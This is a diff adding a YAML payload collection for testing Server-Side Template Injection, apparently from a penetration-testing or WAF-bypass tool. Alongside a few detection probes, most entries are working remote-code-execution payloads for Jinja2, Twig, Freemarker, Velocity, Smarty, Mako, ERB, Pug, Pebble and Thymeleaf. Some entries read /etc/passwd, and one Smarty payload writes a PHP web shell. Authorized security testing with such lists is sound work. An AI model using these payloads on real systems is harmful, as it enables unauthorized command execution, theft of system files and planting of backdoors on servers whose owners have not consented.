@@ -1,0 +1,199 @@
+# SSTI Payloads for WAF Bypass Testing
+# NOTE: These payloads are for authorized penetration testing to identify
+# Server-Side Template Injection vulnerabilities in various template engines.
+name: "SSTI Payloads"
+description: "Server-Side Template Injection payloads for various template engines"
+attack_type: "ssti"
+category: "general"
+
+payloads:
+  # Detection payloads
+  - value: "{{7*7}}"
+    description: "Basic math detection"
+    tags: ["detection", "jinja2", "twig"]
+
+  - value: "${7*7}"
+    description: "Freemarker/Velocity detection"
+    tags: ["detection", "freemarker", "velocity"]
+
+  - value: "#{7*7}"
+    description: "Ruby ERB detection"
+    tags: ["detection", "ruby", "erb"]
+
+  - value: "<%= 7*7 %>"
+    description: "ERB/EJS detection"
+    tags: ["detection", "erb", "ejs"]
+
+  - value: "{{= 7*7}}"
+    description: "Handlebars detection"
+    tags: ["detection", "handlebars"]
+
+  - value: "*{7*7}"
+    description: "Thymeleaf detection"
+    tags: ["detection", "thymeleaf"]
+
+  - value: "@(7*7)"
+    description: "Razor detection"
+    tags: ["detection", "razor"]
+
+  - value: "{7*7}"
+    description: "Smarty detection"
+    tags: ["detection", "smarty"]
+
+  - value: "{{7*'7'}}"
+    description: "Twig string multiplication"
+    tags: ["detection", "twig"]
+
+  - value: "a]a[a}a{a"
+    description: "Error-based detection"
+    tags: ["detection", "error"]
+
+  # Jinja2 payloads (Python)
+  - value: "{{config}}"
+    description: "Jinja2 config object"
+    tags: ["jinja2", "info"]
+
+  - value: "{{config.items()}}"
+    description: "Jinja2 config items"
+    tags: ["jinja2", "info"]
+
+  - value: "{{self.__class__.__mro__}}"
+    description: "Jinja2 MRO"
+    tags: ["jinja2", "introspection"]
+
+  - value: "{{''.__class__.__mro__[2].__subclasses__()}}"
+    description: "Jinja2 subclasses"
+    tags: ["jinja2", "introspection"]
+
+  - value: "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}"
+    description: "Jinja2 subprocess execution"
+    tags: ["jinja2", "rce"]
+
+  - value: "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}"
+    description: "Jinja2 import os"
+    tags: ["jinja2", "rce"]
+
+  - value: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+    description: "Jinja2 via request"
+    tags: ["jinja2", "rce"]
+
+  # Twig payloads (PHP)
+  - value: "{{_self}}"
+    description: "Twig self reference"
+    tags: ["twig", "info"]
+
+  - value: "{{_self.env}}"
+    description: "Twig environment"
+    tags: ["twig", "info"]
+
+  - value: "{{['id']|filter('system')}}"
+    description: "Twig filter system"
+    tags: ["twig", "rce"]
+
+  - value: "{{['cat /etc/passwd']|filter('system')}}"
+    description: "Twig read passwd"
+    tags: ["twig", "rce", "file-read"]
+
+  - value: "{{app.request.server.all|join(',')}}"
+    description: "Twig server vars"
+    tags: ["twig", "info"]
+
+  - value: "{{'id'|filter('system')}}"
+    description: "Twig simple filter"
+    tags: ["twig", "rce"]
+
+  # Freemarker payloads (Java)
+  - value: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+    description: "Freemarker Execute class"
+    tags: ["freemarker", "rce"]
+
+  - value: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+    description: "Freemarker assign execution"
+    tags: ["freemarker", "rce"]
+
+  - value: "${object.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}"
+    description: "Freemarker Runtime"
+    tags: ["freemarker", "rce"]
+
+  - value: "[#assign cmd = 'id'][#assign shell = cmd?eval]${shell}"
+    description: "Freemarker alternate syntax"
+    tags: ["freemarker", "rce"]
+
+  # Velocity payloads (Java)
+  - value: "#set($cmd = 'id')#set($isWin = false)#set($rt = $x.class.forName('java.lang.Runtime'))#set($chr = $x.class.forName('java.lang.Character'))#set($str = $x.class.forName('java.lang.String'))#set($ex = $rt.getRuntime().exec($cmd))$ex.waitFor()#set($out = $ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
+    description: "Velocity Runtime invocation"
+    tags: ["velocity", "rce"]
+
+  - value: "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
+    description: "Velocity shortened"
+    tags: ["velocity", "rce"]
+
+  # Smarty payloads (PHP)
+  - value: "{php}echo `id`;{/php}"
+    description: "Smarty PHP tag"
+    tags: ["smarty", "rce"]
+
+  - value: "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['c']); ?>\",self::clearConfig())}"
+    description: "Smarty file write"
+    tags: ["smarty", "rce"]
+
+  - value: "{system('id')}"
+    description: "Smarty system"
+    tags: ["smarty", "rce"]
+
+  - value: "{$smarty.version}"
+    description: "Smarty version"
+    tags: ["smarty", "info"]
+
+  # Pebble payloads (Java)
+  - value: "{% set cmd = 'id' %}{{ [cmd]|join|shell }}"
+    description: "Pebble shell"
+    tags: ["pebble", "rce"]
+
+  - value: "{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}"
+    description: "Pebble Runtime"
+    tags: ["pebble", "rce"]
+
+  # ERB payloads (Ruby)
+  - value: "<%= system('id') %>"
+    description: "ERB system call"
+    tags: ["erb", "ruby", "rce"]
+
+  - value: "<%= `id` %>"
+    description: "ERB backtick invocation"
+    tags: ["erb", "ruby", "rce"]
+
+  - value: "<%= IO.popen('id').readlines() %>"
+    description: "ERB IO popen"
+    tags: ["erb", "ruby", "rce"]
+
+  - value: "<%= File.read('/etc/passwd') %>"
+    description: "ERB file read"
+    tags: ["erb", "ruby", "file-read"]
+
+  # Mako payloads (Python)
+  - value: "${self.module.cache.util.os.system('id')}"
+    description: "Mako os.system"
+    tags: ["mako", "python", "rce"]
+
+  - value: "${self.module.cache.util.os.popen('id').read()}"
+    description: "Mako os.popen"
+    tags: ["mako", "python", "rce"]
+
+  - value: "<%\nimport os\nx=os.popen('id').read()\n%>${x}"
+    description: "Mako import os"
+    tags: ["mako", "python", "rce"]
+
+  # Jade/Pug payloads (JavaScript)
+  - value: "#{root.process.mainModule.require('child_process').spawnSync('id').stdout}"
+    description: "Jade/Pug spawn process"
+    tags: ["jade", "pug", "nodejs", "rce"]
+
+  # Thymeleaf payloads (Java)
+  - value: "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
+    description: "Thymeleaf SpEL"
+    tags: ["thymeleaf", "java", "rce"]
+
+  - value: "${T(java.lang.Runtime).getRuntime().exec('id')}"
+    description: "Thymeleaf expression"
+    tags: ["thymeleaf", "java", "rce"]
